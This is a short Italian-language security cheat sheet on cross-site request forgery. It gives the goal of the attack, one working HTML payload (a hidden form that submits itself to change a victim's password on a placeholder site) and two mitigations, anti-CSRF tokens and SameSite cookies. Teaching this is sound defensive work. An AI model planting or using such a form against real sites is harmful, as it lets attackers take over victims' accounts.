# CSRF (Cross-Site Request Forgery)

### **Obiettivo**
Forzare il browser della vittima a eseguire azioni non volute su un'applicazione web in cui è autenticata.

### **Payload di Base**

- **Form auto-inviante (Es. Cambio Password):**
    ```html
  <form action="http://target-site.com/change-password" method="POST">
      <input type="hidden" name="new_password" value="hacked123">
  </form>
  <script>document.forms[0].submit();</script>
    ```

### **Mitigazione**
- Usa token Anti-CSRF univoci per ogni sessione.
- Implementa l'attributo `SameSite` nei cookie.
